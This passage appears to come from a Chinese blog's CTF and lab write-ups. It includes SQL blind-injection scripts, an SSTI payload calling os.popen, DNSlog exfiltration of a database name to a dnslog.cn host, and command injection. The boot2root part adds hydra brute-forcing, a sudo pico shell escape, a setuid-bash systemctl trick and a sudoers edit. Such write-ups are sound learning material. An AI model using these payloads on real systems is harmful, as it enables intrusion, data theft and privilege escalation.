exit();&#125;$tmpfname = tempnam(&quot;/tmp/smarty/templates&quot;, &quot;FOO&quot;);$handle = fopen($tmpfname, &quot;w&quot;);fwrite($handle, $_POST[&#x27;data&#x27;]);fclose($handle);$just_file = end(explode(&#x27;/&#x27;,$tmpfname));$smarty-&gt;display($just_file);unlink($tmpfname); 用换行符绕过即可 Bug Report Repo首先是sql盲注，数据库是sqlite，自己写的脚本，效率不够，还是得靠sqlmap 1234567891011121314151617181920212223242526272829import websocketimport stringimport jsonstr=string.ascii_letters+string.digits+string.punctuationws = websocket.WebSocket()ws.connect(&quot;wss://bountyrepo.ctf.intigriti.io/ws&quot;)flag=&#x27;&#x27;for j in range(1,300): aaa=False for i in str: # data=&#123;&quot;id&quot;:f&quot;11 and length(sqlite_version())=&#123;j&#125;&quot;&#125;判断数据库长度 # data=&#123;&quot;id&quot;:f&quot;11 AND SUBSTR((SELECT COUNT(tbl_name) FROM sqlite_master WHERE type=&#x27;table&#x27;),1,1)=CHAR(&#123;j&#125;)&quot;&#125;判断表长度 #data=&#123;&quot;id&quot;:f&quot;11 and substr((select group_concat(tbl_name) from sqlite_master where type=&#x27;table&#x27; limit 0,1),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;&quot;&#125; data = &#123;&quot;id&quot;: f&quot;11 and substr((select group_concat(sql) from sqlite_master),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;&quot;&#125; data=json.dumps(data) #print(data) ws.send(data) a=ws.recv() print(a) if &#x27;Bug report from ethical_hacker is Open&#x27; in a: aaa=True flag+=i print(flag) break #continue if aaa == False: print(&quot;ok&quot;) break 附一个别的师傅写的脚本 12345678910111213141516171819202122232425262728293031import stringfrom websockets.sync.client import connectimport jsonURL = &#x27;bountyrepo.ctf.intigriti.io&#x27;# ALPHABET = string.ascii_uppercase # string.ascii_letters + &#x27;&#123;!_&#125;&#x27;ALPHABET = string.digits + &#x27;.&#x27;PAYLOAD = &quot;1 AND (select sqlite_version()) LIKE &#x27;&#123;guess&#125;%&#x27; -- -&quot;# flag = &#x27;INTIGRITI&#x27; flag = &#x27;&#x27; with connect(f&quot;wss://&#123;URL&#125;/ws&quot;) as websocket: while True: for c in ALPHABET: payload = PAYLOAD.format(guess=flag + c) print(&#x27;\\r&gt;&gt;&gt;&#x27;, payload, end=&#x27;&#x27;) websocket.send(json.dumps(&#123;&quot;id&quot;: payload&#125;)) message = websocket.recv() if &#x27;Bug not found!&#x27; not in message: flag += c print() print(flag) break&#x27;&#x27;&#x27;# PAYLOAD = &quot;1 AND (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type=&#x27;table&#x27; and tbl_name NOT like &#x27;sqlite_%&#x27;) LIKE &#x27;&#123;tables&#125;%&#x27; -- -&quot;# tables = &quot;bug_reports&quot;# PAYLOAD = &quot;1 AND (SELECT GROUP_CONCAT(name) FROM PRAGMA_TABLE_INFO(&#x27;bug_reports&#x27;)) LIKE &#x27;&#123;guess&#125;%&#x27; --&quot;# columns = &#x27;id,category,description,severity,cvss_score,status,reported_by,reported_date&#x27;&#x27;&#x27;&#x27; 爆出来的一条有用的东西 1crypt0:c4tz on /4dm1n_z0n3, really?! 访问是一个登录页面，用给的用户名密码登录，他是得是admin，那就是jwt，但是不知道密钥啊，这个时候就用到了一个工具jwt-cracker爆破密钥，字典用rockyou，key是catsarethebest，伪造admin就ok了 Pizza Time只有一处功能点…. 1sudo nmap -sVC -T4 -Pn -vv -p 443 pizzatime.ctf.intigriti.io 探测web服务，用的是ngnix，可以猜测是Flask/Django或者node 首先fuzz，可以看出除了&amp;和+的所有的特殊字符都被过滤了大括号也被过滤了，难道不是SSTI么？不！他就是SSTI,%0a可以绕过，具体原理是什么我得分析分析源码再写 payload: 1x%0a&#123;&#123;lipsum.__globals__[&quot;os&quot;].popen(&#x27;cat+/etc/passwd&#x27;).read()&#125;&#125; 但是这样会报500，将命令放进header里就可以绕过了 1x%0a&#123;&#123;lipsum.__globals__[&quot;os&quot;].popen(request.headers.get(&quot;X&quot;)).read()&#125;&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"复盘","slug":"ctf/复盘","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"dnslog注入学习","slug":"dnslog注入学习","date":"2023-10-18T02:03:54.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/10/18/dnslog注入学习/","permalink":"https://lvzhouhang.xyz/2023/10/18/dnslog%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"什么是DNSlogDNS（Domain Name System）域名服务系统，简单的说就是域名与IP转换服务，比如用户输入a.com,DNS就会将a.com解析找到它真实的ip，以便于访问服务器上的相关服务，DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名访问的信息，类似于日志文件。 DNSlog回显原理首先我们先了解一下多级域名的概念 域名分级与域名解析过程(DNS) 因特网采用层次树状结构命名方法。域是名字空间中一个可被管理的划分（按机构组织划分），域可被划分为子域，子域可再被划分，即形成了顶级域名、二级域名、三级域名等。从右向左为顶级域名、二级域名、三级域名等，用点隔开。例如872323857.github.io，io就是顶级域名，github就是二级域名，872323857就是三级域名。且域名不分大小写。 通俗的说就是我有个已注册的域名a.com，我在域名代理商那里将域名设置对应的ip 1.1.1.1 上，这样当我向dns服务器发起a.com的解析请求时，DNSlog中会记录下他给a.com解析，解析值为1.1.1.1，而我们这个解析的记录的值就是我们要利用的地方。 自己操作一下才能更好的理解，首先在http://www.dnslog.cn/上获得一个域名，然后我们ping一下 我们将1换成别的试试 可以看到解析的日志会把%USERNAME%的值给带出来，因为系统在ping命令之前会将%USERNAME%的值解析出来，然后再和域名拼接起来。 DNSlog利用sql注入 就以sql盲注为例，后端数据库用的mysql数据库，说一下用dnslog回显只能用于windows系统，为什么呢。因为在利用sql盲注进行DNSlog回显时，需要用到load_file函数，这个函数可以进行DNS请求。那和只能在windows上用有什么关系呢，这里就涉及到Windows的一个小Tips——UNC路径 UNC路径UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。 \\abc.xxx\\test这也就解释了为什么CONCAT()函数拼接了4个\\了,双斜杠表示网络资源路径多加两个\\就是转义了反斜杠。 通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like &#39;%secure%&#39;;查看load_file()可以读取的磁盘。 1、当secure_file_priv为空，就可以读取磁盘的目录。 2、当secure_file_priv为G:\\，就可以读取G盘的文件。 3、当secure_file_priv为null，load_file就不能加载文件。 通过设置my.ini来配置。secure_file_priv=””就是可以load_flie任意磁盘的文件。 在mysql中执行命令select load_file(&#39;\\\\\\\\a.a92pjl.dnslog.cn\\\\a&#39;);可以看到 和之前的结合起来构造语句,用sqli靶场来测试 12&#x27; and if((select load_file(concat(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.bhf0ay.dnslog.cn\\\\abc&#x27;))),1,0)--+ 小结DNSlog注入不止可以用于sql注入，还可以用于xss，xxe，ssrf等，思路打开。 可以参考： https://www.cnblogs.com/Xy--1/p/12896599.html","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"},{"name":"sql注入","slug":"sql注入","permalink":"https://lvzhouhang.xyz/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"SYSTEM_FAILURE_1靶场","slug":"SYSTEM-FAILURE-1靶场","date":"2023-09-16T09:57:06.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2023/09/16/SYSTEM-FAILURE-1靶场/","permalink":"https://lvzhouhang.xyz/2023/09/16/SYSTEM-FAILURE-1%E9%9D%B6%E5%9C%BA/","excerpt":"","text":"跟着别人的视频打一下。 靶场直接就给了ip地址，用nmap扫一下端口 开放了445端口,445端口默认开放的是SMB服务，可以利用相关的工具,smbclient、smbmap 用smbmap扫描可以发现有一个匿名的共享,用smbclient //ip/anonymous连接，空密码直接回车就行。 查看文件发现只有一个share，用get share下载下来,查看share文件。 给了Admin和89492D216D0A212F8ED54FC5AC9D340B，猜测是账号密码，md5解密得qazwsxedc，用xftp连接，或者用lftp连接也可以。 ftp可以连接，ssh试过之后也可以连接。利用linpeas.sh搜集一下有没有可以提权的东西 工具地址：https://github.com/carlospolop/PEASS-ng 但是用户权限太低，没有办法提权。 cd到/Syst3m/F4iluR3,里面有很多文件 他们的大小也都差不多，用find ./ -size +1696c命令找一下有没有不正常的文件,确实能找到file0189.txt，用diff命令可以比一下他与其他的文件有什么不同，但是发现文件内容是一行的，所以要给他们变成单行的。 cat file0189.txt |xargs -n 1 &gt; /tmp/tmp1 cat file.txt |xargs -n 1 &gt; /tmp/tmp1然后再用diff判断他们有什么不同。 发现后面有一串不一样的，需要解密，base62解密得到/Sup3rS3cR37 这个文件夹在/var/www/html/area4里,下载useful.txt，查看/etc/passwd能发现用户名，利用hydra进行爆破 命令:hydra -L user.txt -P useful.txt ssh://192.168.2.243 -V -I -u -e nsr 123-V 显示详细信息-I 忽略现有的恢复文件（不要等待 10 秒）-e “n”表示空密码，“s”尝试登录为通过，“r”尝试反向登录为通过 可以爆破出来密码，登录valex用户。 sudo -l：列出用户可以执行和不可以执行的命令。 可以发现jin用户可以用pico。在网上能找到nano的提权方式 执行命令sudo -u jin /usr/bin/pico 然后 12^R^Xreset; sh 1&gt;&amp;0 2&gt;&amp;0 然后就到jin这个用户了,这个时候就可以执行systemctl了，这个时候就可以用systemctl进行提权。 12345678TF=$(mktemp).serviceecho &#x27;[Service]Type=oneshotExecStart=/bin/sh -c &quot;chmod +s /bin/bash&quot;[Install]WantedBy=multi-user.target&#x27; &gt; $TF./systemctl link $TF./systemctl enable --now $TF 或者修改sudoers 1echo \\&quot;admin ALL=(ALL:ALL) ALL&quot;&gt;&gt;/etc/sudoers 读取到root.txt","categories":[{"name":"boot2root","slug":"boot2root","permalink":"https://lvzhouhang.xyz/categories/boot2root/"}],"tags":[{"name":"vulnhub","slug":"vulnhub","permalink":"https://lvzhouhang.xyz/tags/vulnhub/"}]},{"title":"TFCCTF2023","slug":"TFCCTF2023","date":"2023-08-01T02:49:21.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2023/08/01/TFCCTF2023/","permalink":"https://lvzhouhang.xyz/2023/08/01/TFCCTF2023/","excerpt":"","text":"FORENSICSDOWN BAD修改图片的高度就能得到flag LIST比赛的时候与正确答案插肩而过了，我真该死啊。 附件给了一个流量包，追踪TCP流能发现有类似command=echo+%22ZmluZCAvaG9tZS9jdGYgLXR5cGUgZiAtbmFtZSAiRiIgMj4vZGV2L251bGw%3D%22+%7C+base64+-d+%7C+bash这种，解码是 find /home/ctf -type f -name &quot;T&quot; 2&gt;/dev/null多解码几个可以发现-name的参数就是flag 可以用strings list.pcap|grep command这个代码找到所有的flag，用脚本解码快一点，一个一个解码也可以。 1234567891011121314import base64traces = open(&quot;./2.txt&quot;, &quot;r&quot;).readlines()base64_commands = []for t in traces: t = t.replace(&quot;command=echo+%22&quot;, &quot;&quot;) t = t.replace(&quot;%22+%7C+base64+-d+%7C+bash&quot;, &quot;&quot;) t = t.replace(&quot;%3D&quot;, &quot;&quot;) t = t.strip() print(base64.b64decode(t + &quot;=&quot; * (len(t) % 4)).decode()[30], end=&quot;&quot;)","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"复盘","slug":"ctf/复盘","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"AmateursCTF2023","slug":"AmateursCTF2023","date":"2023-07-19T08:52:42.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/07/19/AmateursCTF2023/","permalink":"https://lvzhouhang.xyz/2023/07/19/AmateursCTF2023/","excerpt":"","text":"WEBwaiting-an-eternity 看文件头，要等好长事件之后才会刷新,直接访问后面的url secretcode是md5解密，但是没什么用，Cookie里有time是时间戳将他改成NAN显示flag funny factorials附件给了一个app.py 可控点在这里，通过改变主题得到flag 123456789101112def filter_path(path): # print(path) path = path.replace(&quot;../&quot;, &quot;&quot;) try: return filter_path(path) except RecursionError: # remove root / from path if it exists if path[0] == &quot;/&quot;: path = path[1:] print(path) return path 将path里面的../删掉了，如果path开头是/会忽视掉，但是如果递归超过1000次就会进入RecursionError然后访问根目录下的flag.txt就行 payload: 1POST /?theme=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../..///flag.txt latek关于latek可以看看这篇文章https://www.freebuf.com/articles/security-management/308191.html 直接用\\input的话flag输出不完全，问了chatgpt可以用其他方法进行任意文件读取 1234567\\documentclass&#123;article&#125;\\usepackage&#123;verbatim&#125;\\begin&#123;document&#125;Hello, world!\\verbatiminput&#123;/flag.txt&#125;\\end&#123;document&#125; REVvolcanoida分析，先看main函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768__int64 __fastcall main(int a1, char **a2, char **a3)&#123; __int64 v4; // rbx __int64 v5; // rbx __int64 v6; // rbx unsigned __int64 v7; // [rsp+8h] [rbp-C8h] BYREF unsigned __int64 v8; // [rsp+10h] [rbp-C0h] BYREF unsigned __int64 v9; // [rsp+18h] [rbp-B8h] BYREF unsigned __int64 v10; // [rsp+20h] [rbp-B0h] FILE *stream; // [rsp+28h] [rbp-A8h] char s[136]; // [rsp+30h] [rbp-A0h] BYREF unsigned __int64 v13; // [rsp+B8h] [rbp-18h] v13 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); printf(&quot;Give me a bear: &quot;); v7 = 0LL; __isoc99_scanf(&quot;%llu&quot;, &amp;v7); if ( !sub_12BB(v7) ) &#123; puts(&quot;That doesn&#x27;t look like a bear!&quot;); return 1LL; &#125; else &#123; printf(&quot;Give me a volcano: &quot;); v8 = 0LL; __isoc99_scanf(&quot;%llu&quot;, &amp;v8); if ( (unsigned __int8)sub_13D9(v8) != 1 ) &#123; puts(&quot;That doesn&#x27;t look like a volcano!&quot;); return 1LL; &#125; else &#123; printf(&quot;Prove to me they are the same: &quot;); v9 = 0LL; v10 = 4919LL; __isoc99_scanf(&quot;%llu&quot;, &amp;v9); if ( (v9 &amp; 1) != 0 &amp;&amp; v9 != 1 ) &#123; v4 = sub_1209(v8); if ( v4 == sub_1209(v7) &amp;&amp; (v5 = sub_124D(v8), v5 == sub_124D(v7)) &amp;&amp; (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) ) &#123; puts(&quot;That looks right to me!&quot;); stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); fgets(s, 128, stream); puts(s); return 0LL; &#125; else &#123; puts(&quot;Nope that&#x27;s not right!&quot;); return 1LL; &#125; &#125; else &#123; puts(&quot;That&#x27;s not a valid proof!&quot;); return 1LL; &#125; &#125; &#125;&#125; 先看sub_12BB和sub_13D9这两个 123456789101112_BOOL8 __fastcall sub_12BB(unsigned __int64 a1)&#123; if ( (a1 &amp; 1) != 0 ) return 0LL; if ( a1 % 3 != 2 ) return 0LL; if ( a1 % 5 != 1 ) return 0LL; if ( a1 % 7 == 3 ) return a1 % 109 == 55; return 0LL;&#125; 123456789101112_BOOL8 __fastcall sub_13D9(unsigned __int64 a1)&#123; unsigned __int64 v2; // [rsp+8h] [rbp-10h] v2 = 0LL; while ( a1 ) &#123; v2 += a1 &amp; 1; a1 &gt;&gt;= 1; &#125; return v2 &gt; 16 &amp;&amp; v2 &lt;= 26;&#125; 逻辑很简单，写脚本爆破一下就行 看后面 123if ( v4 == sub_1209(v7) &amp;&amp; (v5 = sub_124D(v8), v5 == sub_124D(v7)) &amp;&amp; (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) ) 前几个完全没用只用考虑最后一个括号里的内容就行。 sub_1430: 12345678910111213141516unsigned __int64 __fastcall sub_1430(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3)&#123; unsigned __int64 v5; // [rsp+10h] [rbp-18h] unsigned __int64 v6; // [rsp+20h] [rbp-8h] v6 = 1LL; v5 = a1 % a3; while ( a2 ) &#123; if ( (a2 &amp; 1) != 0 ) v6 = v5 * v6 % a3; a2 &gt;&gt;= 1; v5 = v5 * v5 % a3; &#125; return v6;&#125; 直接写脚本爆破就行了 exp: 1234567891011121314151617181920212223242526def check1(a1): if a1 &amp; 1 != 0: return 0 if a1 % 3 != 2: return 0 if a1 % 5 != 1: return 0 if a1 % 7 == 3: return a1 % 109 == 55 return 0def check2(a1): v2 = 0 while a1: v2 += a1 &amp; 1 a1 &gt;&gt;= 1 return 16 &lt; v2 &lt;= 26def s(): for i in range(1,10000000): if check1(i) and check2(i): print(i)def a(): for i in range(1,10): if ((i &amp; 1) != 0 and (i!= 1)): print(i)s() #输出前两个数a() #输出第三个数 bear和volcano的数值一样。 MISCCensorship给了一个main.py 12345678910111213#!/usr/local/bin/pythonfrom flag import flagfor _ in [flag]: while True: try: code = ascii(input(&quot;Give code: &quot;)) if &quot;flag&quot; in code or &quot;e&quot; in code or &quot;t&quot; in code or &quot;\\\\&quot; in code: raise ValueError(&quot;invalid input&quot;) exec(eval(code)) except Exception as err: print(err) 可以执行python的命令,但是不能有flag,e,t，flag是被定义的但是print里有t没有办法回显，可以用python的内置函数获得print。 payload: 1vars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[42]](globals())","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"CrewCTF","slug":"CrewCTF","date":"2023-07-11T07:20:40.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/07/11/CrewCTF/","permalink":"https://lvzhouhang.xyz/2023/07/11/CrewCTF/","excerpt":"","text":"WEBsequence_gallery下载附件 1234567891011121314151617181920212223242526272829303132#main.pyimport osimport sqlite3import subprocessfrom flask import Flask, request, render_templateapp = Flask(__name__)@app.get(&#x27;/&#x27;)def index(): sequence = request.args.get(&#x27;sequence&#x27;, None) if sequence is None: return render_template(&#x27;index.html&#x27;) script_file = os.path.basename(sequence + &#x27;.dc&#x27;) #构造脚本名,将sequence和.dc字符串连接起来，并获取路径中的文件名部分。 if &#x27; &#x27; in script_file or &#x27;flag&#x27; in script_file: return &#x27;:(&#x27; proc = subprocess.run( #运行dc命令 [&#x27;dc&#x27;, script_file], capture_output=True, text=True, timeout=1, ) output = proc.stdout return render_template(&#x27;index.html&#x27;, output=output)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=8080) 12345678subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None)args：表示要执行的命令。必须是一个字符串，字符串参数列表。stdin、stdout 和 stderr：子进程的标准输入、输出和错误。其值可以是 subprocess.PIPE、subprocess.DEVNULL、一个已经存在的文件描述符、已经打开的文件对象或者 None。subprocess.PIPE 表示为子进程创建新的管道。subprocess.DEVNULL 表示使用 os.devnull。默认使用的是 None，表示什么都不做。另外，stderr 可以合并到 stdout 里一起输出。timeout：设置命令超时时间。如果命令执行时间超时，子进程将被杀死，并弹出 TimeoutExpired 异常。check：如果该参数设置为 True，并且进程退出状态码不是 0，则弹 出 CalledProcessError 异常。encoding: 如果指定了该参数，则 stdin、stdout 和 stderr 可以接收字符串数据，并以该编码方式编码。否则只接收 bytes 类型的数据。shell：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。 在subprocess.run()中shell没等于TRUE但是容易受到参数的影响 在kali里用man命令看dc的文档 用-e和!可以执行命令,空格被过滤了，用其他符号绕过，在最后需要加上%0a表示输入了ENTER payload:?sequence=-e$&#123;IFS&#125;!cat$&#123;IFS&#125;*.txt%0A 得到flag:crew&#123;10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx&#125; 放到kali里用dc命令转换为真实的flag","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"复盘","slug":"ctf/复盘","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"UIUCTF2023","slug":"UIUCTF023","date":"2023-07-04T11:58:02.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2023/07/04/UIUCTF023/","permalink":"https://lvzhouhang.xyz/2023/07/04/UIUCTF023/","excerpt":"","text":"MISCvimjail1这道题一连接就是插入模式，想办法退出插入模式. 1234567#entry.sh#!/usr/bin/env shchmod -r /flag.txtvim -R -M -Z -u /home/user/vimrc 以只读、文本不可修改、限制模式、启动并且用/home/user/vimrc替代了原有的.vimrc 123456789#vimrcset nocompatibleset insertmode# 禁用了兼容模式，并且默认启动插入模式inoremap &lt;c-o&gt; nopeinoremap &lt;c-l&gt; nopeinoremap &lt;c-z&gt; nopeinoremap &lt;c-\\&gt;&lt;c-n&gt; nope# 将这些组合键转换为插入单词nope 但是可以按两次ctrl+\\再按一次ctrl+n来绕过，然后用:e来读取flag。 :e表示编辑一个文件 vimjail2123456#entry.sh#!/usr/bin/env shvim -R -M -Z -u /home/user/vimrc -i /home/user/viminfocat /flag.txt 以只读模式、文本不可修改、限制模式启动vim，替换了原有的vimrc和viminfo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#vimrcset nocompatibleset insertmodeinoremap &lt;c-o&gt; nopeinoremap &lt;c-l&gt; nopeinoremap &lt;c-z&gt; nopeinoremap &lt;c-\\&gt;&lt;c-n&gt; nopecnoremap a _cnoremap b _cnoremap c _cnoremap d _cnoremap e _cnoremap f _cnoremap g _cnoremap h _cnoremap i _cnoremap j _cnoremap k _cnoremap l _cnoremap m _cnoremap n _cnoremap o _cnoremap p _cnoremap r _cnoremap s _cnoremap t _cnoremap u _cnoremap v _cnoremap w _cnoremap x _cnoremap y _cnoremap z _cnoremap ! _cnoremap @ _cnoremap # _cnoremap $ _cnoremap % _cnoremap ^ _cnoremap &amp; _cnoremap * _cnoremap - _cnoremap + _cnoremap = _cnoremap ` _cnoremap ~ _cnoremap &#123; _cnoremap &#125; _cnoremap [ _cnoremap ] _cnoremap \\| _cnoremap \\ _cnoremap ; _cnoremap &lt; _cnoremap &gt; _cnoremap , _cnoremap . _cnoremap / _cnoremap ? _ 将所有字符都转换成了下划线，绕过方式还是两次ctrl+\\+ctrl+n，entry.sh中最后有一个cat /flag,这意味着退出vim后会打印出flag. :q即可。 Corny Kernel附件给了一个c文件 12345678910111213141516171819202122232425262728// SPDX-License-Identifier: GPL-2.0-only#define pr_fmt(fmt) KBUILD_MODNAME &quot;: &quot; fmt#include &lt;linux/module.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/kernel.h&gt;extern const char *flag1, *flag2;static int __init pwny_init(void)&#123; pr_alert(&quot;%s\\n&quot;, flag1); return 0;&#125;static void __exit pwny_exit(void)&#123; pr_info(&quot;%s\\n&quot;, flag2);&#125;module_init(pwny_init);module_exit(pwny_exit);MODULE_AUTHOR(&quot;Nitya&quot;);MODULE_DESCRIPTION(&quot;UIUCTF23&quot;);MODULE_LICENSE(&quot;GPL&quot;);MODULE_VERSION(&quot;0.1&quot;); 下面的代码的意思是当加载模块的时候输出第一段flag 123456789static int __init pwny_init(void)&#123; pr_alert(&quot;%s\\n&quot;, flag1); return 0;&#125;...module_init(pwny_init); #这行代码将 pwny_init 函数注册为模块的初始化函数。在模块加载时，该函数将被调用。 首先用gzip -d pwnymodule.ko.gz，然后用insmod pwnymodule.ko加载这个模块，加载完成后会输出第一串flag。 123456static void __exit pwny_exit(void)&#123; pr_info(&quot;%s\\n&quot;, flag2);&#125;module_exit(pwny_exit); #这行代码将 pwny_exit 函数注册为模块的退出函数。在模块被卸载时，该函数将被调用来执行清理操作。 这一串代码的意思是这个模块在被卸载的时候输出第二段flag,用rmmod pwnymodule.ko这个卸载模块,然后用dmesg输出内核的信息，在最后会输出两段flag。 vimjail1.512345#entry.sh#!/usr/bin/env shvim -R -M -Z -u /home/user/vimrc 12345678#vimrcset nocompatibleset insertmodeinoremap &lt;c-o&gt; nopeinoremap &lt;c-l&gt; nopeinoremap &lt;c-z&gt; nopeinoremap &lt;c-\\&gt; nope 别的没变，但是之前的方法没用了，用ctrl+r这个用于执行撤销和重做操作。然后用=execute(readfile(&#39;flag.txt&#39;)) = 是用于执行表达式的命令。execute()：execute() 函数用于执行 Vim 命令。readfile(&#39;flag.txt&#39;)：使用 Vim 的内置函数 readfile() 读取名为 flag.txt 的文件内容，并返回一个包含文件内容的列表。就是将flag.txt里面的内容变成命令执行,然后就会报错 或者，用=execute(&#39;:e flag.txt&#39;)然后按两次回车。 vimjail2.512345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#vimrcset nocompatibleset insertmodeinoremap &lt;c-o&gt; nopeinoremap &lt;c-l&gt; nopeinoremap &lt;c-z&gt; nopeinoremap &lt;c-\\&gt; nopecnoremap a _cnoremap b _cnoremap c _cnoremap d _cnoremap e _cnoremap f _cnoremap g _cnoremap h _cnoremap i _cnoremap j _cnoremap k _cnoremap l _cnoremap m _cnoremap n _cnoremap o _cnoremap p _cnoremap r _cnoremap s _cnoremap t _cnoremap u _cnoremap v _cnoremap w _cnoremap x _cnoremap y _cnoremap z _cnoremap ! _cnoremap @ _cnoremap # _cnoremap $ _cnoremap % _cnoremap ^ _cnoremap &amp; _cnoremap * _cnoremap - _cnoremap + _cnoremap = _cnoremap ` _cnoremap ~ _cnoremap &#123; _cnoremap &#125; _cnoremap [ _cnoremap ] _cnoremap \\| _cnoremap \\ _cnoremap ; _cnoremap &lt; _cnoremap &gt; _cnoremap , _cnoremap . _cnoremap / _cnoremap ? _ 这个只能输入:q，方法基本上差不多，还是ctrl+r然后=,按TAB键可以补全内置代码，然后找到execute，最后的命令是execute(&quot;:q&quot;)，后会输出flag。 cryptoThree-Time Padhttp://dann.com.br/alexctf2k17-crypto100-many_time_secrets/ 看这篇博客，用他的脚本可以解出这道题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#!/usr/bin/python## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017# @author intrd - http://dann.com.br/ # Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)import stringimport collectionsimport sets, sys# 11 unknown ciphertexts (in hex format), all encrpyted with the same keyc1 = &quot;14f5f95b4a252948a8aef177d6c92d82e3016362bd7463f41f40a00ad9e0ccad911b959ef8dfad5f1cc4481ecb64&quot;c2 = &quot;06e2f65a4c256d0ba8ada164cecd329cae436069f83476e91757e91bd4a4cce2c60a8f9aac8cb14210d55253cd787c0f6a&quot;c3 = &quot;03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386&quot;ciphers = [c1, c2, c3]# The target ciphertext we want to cracktarget_cipher = &quot;03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386&quot;# XORs two stringdef strxor(a, b): # xor two strings (trims the longer input) return &quot;&quot;.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, 